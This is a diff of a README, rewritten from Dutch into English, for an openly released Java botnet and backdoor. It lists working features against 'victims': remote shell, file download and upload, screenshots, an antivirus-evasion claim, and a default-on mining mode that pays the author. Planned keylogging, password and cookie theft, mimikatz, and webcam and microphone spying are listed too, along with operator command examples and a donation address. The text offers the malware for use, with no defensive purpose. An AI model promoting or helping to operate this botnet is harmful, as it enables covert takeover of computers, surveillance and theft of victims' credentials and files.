@@ -1,49 +1,57 @@
-het staat nu definitief de source code van de botnet is open source. :D 
+It is ofical the botnet is open source :D
 
+here is a list of all the options:
 
-hier is een lijst van alle opties die nu werken en waar ik aan werk:
+it supports a 1000 users, shell acces to the infected computer, information giving about the infected computer like ( external ip, hostname, operating system and administrator or not when your on windows ), keepalive check, screenshot, downloaden and uploaden.
 
-    op het moment kan de botnet 1000 users aan, shell acces op iemands anders computer geven, informatie geven over de operating system, de externe ip en hostname meegeven tijdens de backdoor start, en heeft een test voor te checken of de backdoor nog loopt en doorgeven aan de botnet operator, een lijst geven van alle users op OS gefiltert en op een persoon of alle users een command sturen, screenshot nemen, downloaden en uploaden.
+things that are partitional completed are: selfdestruct the virus.
 
-    dingen dat gedeeltelijk klaar zijn: Selfdestruct optie.
+the backdoor isn't seen by any viruscaner ( checked on date 11/3/2017 ).
+the botnet is written in java with netbeans.
 
-    de backdoor wordt niet gezien door virusscaners zoals avast, eset, norton, mcafee, avg enz.
-    de backdoor en botnet zijn geschreven in java met netbeans.
+things that i didn't add are Ddos or raandsomeware.
 
-    een ding wat hij nooit gaat doen is ddosen!
-    ook geen ransomware!
+options that i am working on are: vnc, webcam snapshot, a keylogger, Persistence backdoor, network scan likely with nmap, passwords and cookie grap ( also skype ), video on full screen that cant be closed, mimikatz, Distributed hash cracking, microfone spying, popup for credentials, script mining.
 
-    opties waar ik nog aan werk voor ik de botnet open source maak is vnc, webcam snapshot, een keylogger, Persistence backdoor, network scan met bijvoorbeeld nmap, passwoorden en cookies copiéren ( tel ik ook skype bij ), video op fullscreen dat niet kan gesloten worden, mimikatz ,Distributed hash cracking, microfoon afluisteren, popup voor credentials/ask van metasploit, scrypt mining.
+there is a option thats enabled is sponsormode that will if enabled mine for the creator but it can easly be dissabled by going in the server and change the varible sponsormode from true to false.
 
+this are the wworking options:
+list info : that will give you a detailed list of all the computers in the botnet and thee hostname, external ip, operating system, adn if on windows if it had administrator rights.
+msgbox : this will give a msgbox on the targets computer.
+download : here can you download a file from the infected computer to the server ( full path is needed )
+upload : send a file to the computers tmp using a url.
+shell : here can you type cmd commands to the computer ( the shell closes automatic when the command is completed ).
+screenshot : here can you make a screenshot of the defauld screen from the infecteed computer ( will be sended to the servers)
+javaversion : request version of java from infected computer.
+exit : closes connection.
 
-een optie dat wel aan staat is sponsormode wat betekent dat via litecoin mining wordt geminned voor de makers van de botnet.
-Maar dit kun je makkelijk af zetten door in de source code van de server sponsormode van true naar false te zetten.
+by thee options msgbox, download, upload, shell, screenshot, javaversion and exit you have to give the hostname and external ip to send to someone here some examples you can find the hostname and external ip easy with list info : 
+minepc@1.2.3.4 shell dir C:\
+minepc@1.2.3.4 msgbox hello
+minepc@1.2.3.4 download C:\Users\mh123hack\Downloads\botnet-herder.jpg
+minepc@1.2.3.4 upload http://thestartupmag.com/wp-content/uploads/2016/10/hacked.png
+minepc@1.2.3.4 screenshot
+minepc@1.2.3.4 javaversion
+minepc@1.2.3.4 exit
+list info
 
-dit zijn de opties die je kunt gebruiken:
+the victum is also the client open the victum with netbeans to control the botnet!
 
-list info = dat je een lijst krijgt van alle op hostname en extern ip dat ook in de variabele whoami zit.
-msgbox = dat je een popup sherm kan maken aan de victums kant.
-download = dat je vanaf de victum naar de server kunt sturen.
-upload = dat je naar de victum iets via een url kan uploaden.
-shell = dat je cmd commando's kan sturen je hoeft alleen geen cmd te tikken.
-screenshot = dat e een screenshot krijgt van het standaard scherm en wordt gesttur naar de server.
-javaversion = je krijgt de java version van de victum.
-exit = sluit aan de victums kant het virus af.
+the botnet is supported for windows, linux, and maby mac but i havend tested this.
+the standard port for the precompiled server ( botnet-server.jar ) is 4600 but you can change this in the source code.
 
-bij de opties msgbox, download, upload, shell, screenshot, javaversion en exit moet je altijd meegeven de hostname en de externe ip zoals dit: mijnpc@1.2.3.4
-je kunt dit makkelijk weten via de optie: list info
+i hope you like my botnet :D
 
-de standerd port van de server is 4600
-
-met als voorbeeld van een bericht: mijnpc@1.2.3.4 shell dir C:\
-je kunt dit makkelijk weten via de optie: list info
-
-de botnet werkt op windows en linux en misschien mac omdat ik dat niet heb getest.
-
-de standerd port van de server is 4600
-
-ik hoop de je het een goede botnet vind :D
-
-met vriendelijke groet
+dear regards.
 mh123hack
 litecoin: LaLRA68RC6EdUdFFxtbkgzvmTSKRyFZndk
+
+if you want your hacker name here donate or make the botnet famous.
+retweet: https://twitter.com/martinhermens1/status/839979932541415424
+
+DONATORS:
+
+
+
+
+SHARES:
